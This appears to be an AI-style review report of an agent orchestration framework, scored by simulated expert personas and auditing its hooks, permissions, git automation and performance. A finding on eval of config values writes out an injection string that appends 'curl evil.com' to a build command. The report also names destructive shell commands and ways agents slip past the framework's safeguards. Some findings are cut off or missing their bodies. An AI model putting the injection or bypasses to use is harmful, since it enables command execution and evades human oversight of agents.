REPOSITORY SUMMARY
------------------
AIDLC is an orchestrator-based AI development lifecycle framework that
uses Claude Code's experimental agent teams feature to coordinate 10
specialized AI agents through a 7-phase pipeline. It separates docs
(AIDLC repo) from source code (external repo), enforces phase gates
via 30+ bash hooks across 7 lifecycle events, and produces a
structured bolt-based artifact trail.

Key stats:
- 30 hook scripts (~2,910 lines total)
- 10 agent definitions
- 760-line WORKFLOW.md
- 97-line CLAUDE.md orchestrator bootstrap
- 7 detector plugin directories
- 4 shared library scripts
- Standards, templates, and checklists ecosystem

CRITICAL FINDINGS (5)
------------------------------------------------------------------------

C-1 | bypassPermissions on ALL agents — zero trust boundaries
    | Personas: CTO/Security Architect, Staff Engineer
    | File: .claude/settings.json (line 7), enforce-permissions.sh
    |
    | settings.json sets defaultMode: "bypassPermissions" globally AND
    | enforce-permissions.sh BLOCKS agents that do NOT use
    | bypassPermissions. This means every agent — including the
    | decomposer (which only needs Read/Write/Edit) — gets full Bash(*)
    | access. The framework actively PREVENTS least-privilege. If any
    | agent hallucinates a destructive bash command (rm -rf, git push
    | --force), nothing stops it. The decomposer agent definition even
    | sets disallowedTools: Bash, but bypassPermissions overrides this
    | since the runtime permission model is "allow everything."
    |
    | RECOMMENDATION: Remove global bypassPermissions. Use per-agent
    | tool allowlists. At minimum, non-engineering agents should not
    | have Bash access.

C-2 | bolt-state.sh auto-corrects README.md without git commit
    | Personas: Data Integrity Guardian, SRE/DevOps
    | File: .claude/hooks/bolt-state.sh (lines 55-107)
    |
    | bolt-state.sh silently rewrites README.md files to "correct"
    | status drift. This is a side-effect hidden inside what appears
    | to be a read-only state query. Problems:
    | (a) Calling bolt-state.sh during hook execution triggers writes
    |     that are never committed, creating phantom git diffs
    | (b) Multiple hooks call bolt-state.sh (gate-check, dependency-
    |     check, inject-bolt-context, verify-bolt-output, integration-
    |     verify, decisions-check) — each invocation may rewrite files
    | (c) Auto-correction masks the root cause of drift instead of
    |     surfacing it for investigation
    | (d) No audit trail — corrections are logged in JSON output but
    |     never persisted
    |
    | RECOMMENDATION: Separate state reading from state mutation.
    | bolt-state.sh should be pure-read. Create a separate
    | fix-drift.sh that the orchestrator calls explicitly with a
    | git commit afterward.

C-3 | eval of build commands from JSON config — injection risk
    | Personas: CTO/Security Architect, Framework Specialist
    | File: .claude/hooks/build-check.sh (line 93),
    |        auto-checkpoint.sh (line 62),
    |        verify-bolt-output.sh (line 79)
    |
    | Multiple hooks use `eval "$BUILD_CMD"` where BUILD_CMD is read
    | from project-config.json. If a malicious or malformed config
    | value is present (e.g., "command": "pnpm build; curl evil.com"),
    | arbitrary commands execute. The config is user-authored, but in
    | a multi-user or CI context this is exploitable.
    |
    | RECOMMENDATION: Use an allowlist of known build runners
    | (pnpm, npm, yarn, go, cargo, dotnet) and validate the command
    | structure before eval. Or use a subprocess array instead of
    | shell eval.

C-4 | No rollback or recovery on hook-initiated git commits
    | Personas: SRE/DevOps, Staff Engineer
    | File: .claude/hooks/auto-checkpoint.sh
    |
    | auto-checkpoint.sh commits to git automatically after engineer
    | agent completion. If the commit includes incorrect changes
    | (agent produced wrong code that happens to build), there is no
    | mechanism to roll back. The hook uses `git add -u` which stages
    | ALL tracked modifications — potentially including unrelated
    | changes from other concurrent operations. Combined with the
    | experimental agent teams feature (parallel engineers), this
    | could commit partial work from one agent mixed with another's
    | changes.
    |
    | RECOMMENDATION: Stage only files the agent actually modified
    | (track via agent transcript or file watcher). Add a verification
    | step or at minimum use `git stash` as a safety net.

C-5 | Cascading bolt-state.sh invocations — O(n^2) file reads
    | Personas: Performance Oracle, SRE/DevOps
    | File: Multiple hooks calling bolt-state.sh
    |
    | Every SubagentStart fires 4 hooks (inject-bolt-context,
    | require-tech-stack, gate-check, dependency-check). Each calls
    | bolt-state.sh independently, which reads EVERY bolt's README.md,
    | code-review.md, qa-results.md, and decisions-needed.md. For a
    | project with 20 bolts, that's 4 hooks x ~60 file reads = 240
    | file reads PER AGENT SPAWN. SubagentStop fires 2 more hooks
    | that also call bolt-state.sh. Engineering team spawn (4 agents)
    | triggers ~960 file reads just for state checking.
    |
    | RECOMMENDATION: Cache bolt-state.sh output in a temp file with
    | a short TTL (e.g., 10 seconds). Or run it once at the hook
    | event level and pipe the result to all hooks.

H-3 | Node.js required on every machine — no fallback
    | Persona: Framework Specialist (Bash/Shell)
    | File: Every hook script
    |
    | All 30 hooks shell out to Node.js for JSON parsing. If Node is
    | not installed or not in PATH, every hook silently exits 0
    | (passes). The health-check.sh script checks for node but only
    | as an informational warning — it never blocks. A system without
    | Node would have zero enforcement.
    |
    | RECOMMENDATION: Make health-check.sh a hard gate that blocks
    | the orchestrator loop if Node is missing. Consider using jq
    | as a lighter alternative for simple JSON parsing.

H-4 | update-bolt-status.sh has dual source of truth
    | Persona: Data Integrity Guardian
    | File: .claude/hooks/update-bolt-status.sh (lines 142-159)
    |

    | and "index.md is a derived view," the hook independently parses
    | and rewrites index.md columns using string splitting on pipe
    | characters. If the index.md table format changes (extra column,
    | different order), the split-on-pipe logic silently corrupts the
    | table.
    |
    | RECOMMENDATION: Remove index.md updates from this hook. Make
    | index regeneration a separate, explicit operation that reads
    | README.md files (the declared source of truth).

H-5 | block-src-writes.sh relies on CLAUDE_AGENT_NAME env var

    | Persona: Architecture Strategist
    | File: auto-checkpoint.sh (lines 88-114)

PERSONA SUMMARIES
========================================================================

1. STAFF ENGINEER (Will Larson)
   Score: 7/10
   The hook system is impressively comprehensive — 30 scripts covering
   phase gates, output verification, branch management, and wiring
   checks. The code quality is generally solid with consistent
   patterns. However, the lack of tests for the control plane (H-6),
   the bolt-state mutation-in-read antipattern (C-2), and the
   cascading performance issue (C-5) are serious engineering debts.
   The detector plugin architecture (dispatch.sh + verdict.sh) is
   well-designed and extensible.

2. FIRST PRINCIPLES (Elon Musk)
   Score: 6/10
   The system is over-engineered for the problem it solves. 10 agents
   and 30+ hooks to produce what is essentially a phased development
   pipeline. The fundamental question: does agent-level enforcement
   (hooks that fire on every tool use) justify the overhead vs.
   orchestrator-level enforcement (check before spawning)? Many hooks
   duplicate checks the orchestrator should do once. The two-repo
   architecture adds complexity without clear benefit — a monorepo
   with directory boundaries would be simpler.

3. RADICAL TRANSPARENCY (Ray Dalio)
   Score: 6/10
   Several claims in docs do not match reality:
   - tech-stack-change.sh documented as PostToolUse but configured
     as PreToolUse (H-9)
   - supply-chain-analyst referenced in active code despite being
     retired (H-8, M-12, M-13)
   - Product Owner referenced in WORKFLOW.md despite retirement (M-12)
   - bypassPermissions documented as "permission inheritance" but
     functionally is "zero permissions enforcement" (C-1)
   The operational honesty of the status drift prevention system is
   good — WORKFLOW.md explicitly calls out the "218 out of sync"
   lesson from a prior system (AIDLS).

4. CTO / SECURITY ARCHITECT
   Score: 4/10
   The security posture has fundamental gaps:
   - bypassPermissions on everything (C-1) — no trust boundaries
   - eval of user-controlled config values (C-3) — injection risk
   - AIDLC_SKIP_HOOK bypass (H-1) — undocumented escape hatch
   - Keyword-based hook bypass (H-2) — trivially circumventable
   - eval of Node output (M-18) — defense-in-depth violation
   - No agent can be prevented from modifying AIDLC's own hook
     scripts (nothing blocks writes to .claude/hooks/)
   The framework has enforcement depth but enforcement breadth is
   missing — it guards the workflow but not itself.

5. SRE / DEVOPS
   Score: 5/10
   Reliability concerns:
   - No recovery from failed auto-commits (C-4)
   - Split-brain two-repo commits (H-10)
   - No circuit breaker on stuck orchestrator loops (M-16)
   - No timeout on agent spawns (M-11)
   - Compaction recovery overwrites without merge (H-7)
   The compaction-recovery.sh is a genuine innovation — preserving
   orchestrator state across context window boundaries is a real
   problem well-addressed. But the write-without-commit pattern in
   bolt-state.sh (C-2) creates invisible state corruption.

6. PERFORMANCE ORACLE
   Score: 5/10
   Hook overhead is the dominant concern:
   - O(n^2) file reads from cascading bolt-state.sh calls (C-5)
   - Node.js process spawn per JSON parse (~100ms each) (M-1)
   - SubagentStart fires 4-6 hooks before the agent runs (M-1)
   - Duplicate build checks on SubagentStop and PostToolUse (M-15)
   - No caching of state between hook invocations
   For a 20-bolt project, the hook overhead per bolt could add
   5-10 seconds of pure infrastructure latency per agent phase.

7. DATA INTEGRITY GUARDIAN
   Score: 7/10
   Strong points: artifact-presence-based phase detection, auto-
   correction of status drift, multi-hook verification chain. The
   README.md-as-source-of-truth pattern is sound. Weaknesses:
   bolt-state.sh mutation in reads (C-2), dual index/README updates
   (H-4), fragile bolt ID extraction (H-11), and the decisions-check
   severity parsing mismatch (M-14).

8. ARCHITECTURE STRATEGIST
   Score: 7/10
   The overall architecture is coherent: hooks as enforcement layer,
   agents as execution layer, WORKFLOW.md as the contract, bolt
   artifacts as the audit trail. The detector plugin system (dispatch
   + verdict + category-specific detectors) is well-factored. Key
   weaknesses: the coupling between hooks and bolt-state.sh creates
   a single point of contention, and the two-repo architecture adds
   accidental complexity. The agent definitions are excellently
   structured with clear phase declarations, prerequisites, and
   output specifications.

9. PATTERN RECOGNITION
   Score: 7/10
   Positive patterns: consistent hook structure (cross-platform
   normalization, early exit on missing config, JSON output format),
   agent definitions follow a template, fix-retest loop is well-
   documented. Anti-patterns: God object (bolt-state.sh does too
   much), keyword-based security bypass (H-2), side-effects in
   readers (C-2), eval for command execution (C-3).

10. FRAMEWORK SPECIALIST (Bash/Shell)
    Score: 6/10
    Strengths: cross-platform path normalization in every hook,
    proper quoting, consistent use of node for JSON parsing (portable
    across platforms). Weaknesses: set -euo pipefail used
    inconsistently (only in verify-wiring.sh), no shellcheck
    configuration, temp file cleanup gaps (L-11), the quadruple-
    backslash regex bug (M-6), eval usage (C-3, M-18).

11. TEST QUALITY ANALYST
    Score: 2/10
    Zero tests for the framework itself. The hooks are the critical
    enforcement mechanism — they ARE the framework's value proposition
    — and they have no automated testing. health-check.sh verifies
    only file existence and bash syntax, not behavior. There is no
    CI pipeline visible in the repository. The framework extensively
    requires test coverage from the projects it manages while having
    none for itself.

12. COST & EFFICIENCY
    Score: 5/10
    Running 10 agents with 6 on Opus per bolt is expensive. A 20-bolt
    project runs: 20 decomposer (Sonnet) + 20 product-analyst
    (Sonnet) + 20 fullstack-designer (Opus) + 80 engineering team
    (4x Opus) + 20 code-reviewer (Sonnet) + 20 qa-engineer (Sonnet)
    = 180 agent invocations, 100 of which are Opus. The WORKFLOW.md
    context (760 lines) is read by every agent, adding ~2K tokens
    per spawn x 180 = ~360K tokens just for workflow context. The
    hook-injected context (checklists, mistakes, bolt state) adds
    more. The "intensity" system (Full/Standard/Lean) is a good cost
    optimization lever — Lean bolts drop to Sonnet for engineering.

========================================================================
OVERALL ASSESSMENT
========================================================================

AIDLC is an ambitious and genuinely innovative framework that pushes
Claude Code's experimental agent teams to their practical limits. The
hook-based enforcement system, multi-agent coordination model, and
artifact-driven state management represent real engineering craft.

The core innovation — using bash hooks across 7 lifecycle events to
enforce a development methodology on AI agents — is powerful and
largely well-executed. The agent definitions are exceptionally
detailed, with clear phase declarations, prerequisite checks, and
output specifications that would reduce agent drift.

However, the framework has significant security and reliability gaps
that must be addressed before production use:

1. The bypassPermissions-everywhere model (C-1) fundamentally
   undermines the trust boundaries the framework claims to enforce.
2. The bolt-state.sh mutation-in-read pattern (C-2) creates invisible
   state corruption.
3. The lack of tests for the control plane (H-6) means the
   enforcement system itself is unverified.
4. The performance overhead of cascading hook invocations (C-5) will
   scale poorly.

Compared to lighter-weight approaches (single orchestrator with
inline checks), AIDLC trades simplicity for depth of enforcement.
Whether that trade-off is worthwhile depends on the team's tolerance
for framework overhead vs. the cost of agent errors in production
codebases.
